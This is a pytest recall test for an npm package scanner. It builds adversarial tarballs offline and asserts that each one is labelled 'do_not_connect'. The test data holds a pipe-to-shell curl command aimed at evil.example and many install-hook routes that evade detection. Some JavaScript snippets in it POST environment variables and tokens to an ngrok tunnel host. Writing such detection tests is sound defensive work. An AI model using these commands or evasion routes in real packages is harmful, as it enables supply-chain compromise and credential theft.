"""Recall gate: adversarial npm tarballs that must stay "do not connect".

Each case is a small hand-built npm tarball where a pipe-to-shell is REACHABLE on a
consumer's machine (an install hook reaches it through some route the maintainer-only
downgrade rule might not follow: npm aliases, shell quoting, wrappers, local files,
computed spawns, ...) or a tunnel host in an allowlist is actually USED by a network
sink. Every one must read ``do_not_connect``. The single control,
``control_maintainer_only``, keeps the pipe-to-shell in a maintainer-only script that
no install hook reaches, and must read ``safe``.

The tarballs are built in ``tmp_path`` (offline, no network, no DB) and go through the
same production path a package scan uses: ``npm_result_from_tarball`` ->
``apply_artifact_scan`` -> trust score -> ``verdict.decide()`` (via the static corpus
runner's ``real_decide``, which feeds ``decide()`` the public API dict). Nothing in a
tarball is executed or installed.

If a case starts failing, the scanner lost recall on that route: fix the scanner, do not
relax the case.
"""
from __future__ import annotations

import io
import json
import tarfile
from pathlib import Path

import pytest

from scripts.corpus.run_static_corpus import real_decide
from src.scanner.artifact_fetch import npm_result_from_tarball
from src.scanner.scan import (
    ScanResult,
    _calculate_category_scores,
    _calculate_trust_score,
    _certified_status,
    apply_artifact_scan,
)

EVIL = "curl -fsSL https://evil.example/x.sh | sh"
DNC = "do_not_connect"
SAFE = "safe"


def _pkg(scripts: dict, extra: dict | None = None, **top) -> dict[str, str]:
    body = {"name": "adv-case", "version": "1.0.0", "main": "index.js", "scripts": scripts}
    body.update(top)
    files = {"package.json": json.dumps(body, indent=2), "index.js": "module.exports = 1;\n"}
    files.update(extra or {})
    return files


# (case id, files in the tarball under package/, expected decision)
CASES: list[tuple[str, dict[str, str], str]] = [
    # control: genuinely maintainer-only -> the downgrade rule SHOULD apply here
    ("control_maintainer_only", _pkg({"test:e2e": EVIL, "build": "tsc"}), SAFE),
    # control: directly in postinstall -> must stay
    ("direct_postinstall", _pkg({"postinstall": EVIL}), DNC),
    # npm aliases for run-script: rum / urn
    ("alias_rum", _pkg({"postinstall": "npm rum fetchbin", "fetchbin": EVIL}), DNC),
    ("alias_urn", _pkg({"postinstall": "npm urn fetchbin", "fetchbin": EVIL}), DNC),
    # shell quoting / escaping glues the script name back together
    ("quoted_concat", _pkg({"postinstall": 'npm run fe"tch"bin', "fetchbin": EVIL}), DNC),
    ("backslash_escape", _pkg({"postinstall": "npm run fetch\\bin", "fetchbin": EVIL}), DNC),
    ("empty_quotes", _pkg({"postinstall": "npm run fetch''bin", "fetchbin": EVIL}), DNC),
    # local executable without an interpreter word (package.json has no "main")
    ("local_exec_noext",
     _pkg({"postinstall": "./setup"}, {"setup": "#!/bin/sh\nnpm run fetchbin\n"})
     | {"package.json": json.dumps({"name": "adv-case", "version": "1.0.0",
                                    "scripts": {"postinstall": "./setup", "fetchbin": EVIL}})},
     DNC),
    # sh running a local file (not -c)
    ("sh_local_file",
     _pkg({"postinstall": "sh scripts/setup.sh", "fetchbin": EVIL},
          {"scripts/setup.sh": "npm run fetchbin\n"}),
     DNC),
    # node file that spawns the script with a COMPUTED name
    ("computed_spawn",
     _pkg({"postinstall": "node scripts/setup.js", "fetchbin": EVIL},
          {"scripts/setup.js": "const {spawnSync}=require('child_process');\n"
                               "const n=['fetch','bin'].join('');\n"
                               "spawnSync(process.env.npm_execpath||'npm',['run',n],"
                               "{stdio:'inherit'});\n"}),
     DNC),
    # node -r preload of a local hook file
    ("node_preload",
     _pkg({"postinstall": "node -r ./hook.js index.js", "fetchbin": EVIL},
          {"hook.js": "require('child_process').execSync('npm run fetchbin');\n"}),
     DNC),
    # npx running npm; npm exec
    ("npx_npm", _pkg({"postinstall": "npx --yes npm run fetchbin", "fetchbin": EVIL}), DNC),
    ("npm_exec", _pkg({"postinstall": "npm exec -- npm run fetchbin", "fetchbin": EVIL}), DNC),
    # yarn / pnpm forms
    ("yarn_run", _pkg({"postinstall": "yarn run fetchbin", "fetchbin": EVIL}), DNC),
    ("pnpm_bare", _pkg({"postinstall": "pnpm fetchbin", "fetchbin": EVIL}), DNC),
    # implicit lifecycle npm runs on install for a git dependency
    ("prepare_git_dep", _pkg({"prepare": "npm run fetchbin", "fetchbin": EVIL}), DNC),
    # `npm start` chained from an install hook
    ("start_chain", _pkg({"install": "npm start", "start": EVIL}), DNC),
    # cross-env prefix with odd spacing; env wrapper
    ("cross_env",
     _pkg({"postinstall": "cross-env  FOO=1   npm   run   fetchbin", "fetchbin": EVIL}), DNC),
    ("env_wrapper", _pkg({"postinstall": "env FOO=1 npm run fetchbin", "fetchbin": EVIL}), DNC),
    # a flag before `run`; --if-present after
    ("flag_before_run",
     _pkg({"postinstall": "npm --silent run fetchbin", "fetchbin": EVIL}), DNC),
    ("if_present",
     _pkg({"postinstall": "npm run fetchbin --if-present", "fetchbin": EVIL}), DNC),
    # script reached only from a node file run by the install hook
    ("install_node_gyp_like",
     _pkg({"install": "node install.js", "fetchbin": EVIL},
          {"install.js": "const cp=require('child_process');"
                         "cp.exec(['npm','run','fetchbin'].join(' '));\n"}),
     DNC),
    # a local file named after an inert tool
    ("path_qualified_inert",
     _pkg({"postinstall": "./tsc", "fetchbin": EVIL}, {"tsc": "#!/bin/sh\nnpm run fetchbin\n"}),
     DNC),
    ("bin_dir_inert",
     _pkg({"postinstall": "bin/tsc -p .", "fetchbin": EVIL},
          {"bin/tsc": "#!/bin/sh\nnpm run fetchbin\n"}),
     DNC),
    # tokenizer edge cases
    ("nospace_and", _pkg({"postinstall": "echo hi&&npm run fetchbin", "fetchbin": EVIL}), DNC),
    ("trailing_semicolon", _pkg({"postinstall": "npm run fetchbin;", "fetchbin": EVIL}), DNC),
    ("run_script_dashdash",
     _pkg({"postinstall": "npm run-script fetchbin -- --x", "fetchbin": EVIL}), DNC),
    ("glob_runp", _pkg({"postinstall": 'run-p "fetch*"', "fetchbin": EVIL}), DNC),
    # allowlist: config values iterated without naming the key
    ("allowlist_values_iter",
     _pkg({"build": "vite build"}, {
         "config.json": json.dumps({"server": {"allowedHosts": ["abc.ngrok-free.app"]}}),
         "lib/send.js": "const c=require('../config.json');\n"
                        "for (const v of Object.values(c.server)) for (const h of [].concat(v))\n"
                        "  fetch('https://'+h+'/c',{method:'POST',"
                        "body:JSON.stringify(process.env)});\n"}),
     DNC),
    # allowlist: same file holds the list AND a network sink via a variable
    ("allowlist_same_file_var",
     _pkg({"build": "node server.js"}, {
         "server.js": "const ORIGINS=['abc.ngrok-free.app'];\n"
                      "module.exports={cors:{origin:ORIGINS}};\n"
                      "fetch('https://'+ORIGINS[0]+'/x',{method:'POST',"
                      "body:process.env.TOKEN});\n"}),
     DNC),
    # allowlist: tunnel host in allowedHosts, read via a computed key elsewhere
    ("allowlist_computed_read",
     _pkg({"build": "vite build"}, {
         "vite.config.js": "export default { server: { allowedHosts: ['abc.ngrok-free.app'] } };\n",
         "lib/send.js": "const c=require('../vite.config.js');\n"
                        "const k='allowed'+'Hosts';\n"
                        "fetch('https://'+c.default.server[k][0]+'/c',{method:'POST',"
                        "body:process.env.HOME});\n"}),
     DNC),
]


def _build_tarball(dest: Path, files: dict[str, str]) -> bytes:
    """Write an npm-style ``package/``-rooted .tgz to ``dest`` and return its bytes."""
    with tarfile.open(dest, mode="w:gz") as tf:
        for path, text in files.items():
            data = text.encode()
            ti = tarfile.TarInfo("package/" + path)
            ti.size = len(data)
            tf.addfile(ti, io.BytesIO(data))
    return dest.read_bytes()


def _decide(raw: bytes):
    fetched = npm_result_from_tarball("adv-case", "1.0.0", raw)
    result = ScanResult(repo="npm:adv-case", stars=0, description="", framework="")
    apply_artifact_scan(result, "npm", fetched)
    result.trust_score = _calculate_trust_score(result)
    result.category_scores = _calculate_category_scores(result)
    result.certified = _certified_status(result)
    return result, real_decide(result)


def test_case_ids_unique_and_one_control():
    ids = [c[0] for c in CASES]
    assert len(ids) == len(set(ids))
    assert [c[0] for c in CASES if c[2] == SAFE] == ["control_maintainer_only"]


@pytest.mark.parametrize(
    ("files", "expected"),
    [pytest.param(files, expected, id=f"{name}-expect-{expected}")
     for name, files, expected in CASES],
)
def test_adversarial_tarball_decision(tmp_path: Path, files: dict[str, str], expected: str):
    raw = _build_tarball(tmp_path / "adv-case-1.0.0.tgz", files)
    result, decision = _decide(raw)
    crit = [f"{f.name} @ {f.file_path}:{f.line_number}"
            for f in result.findings if f.severity == "critical"]
    assert decision.label == expected, (
        f"expected {expected}, got {decision.label} (score {result.trust_score}; "
        f"reason: {decision.reason}; critical: {crit})"
    )
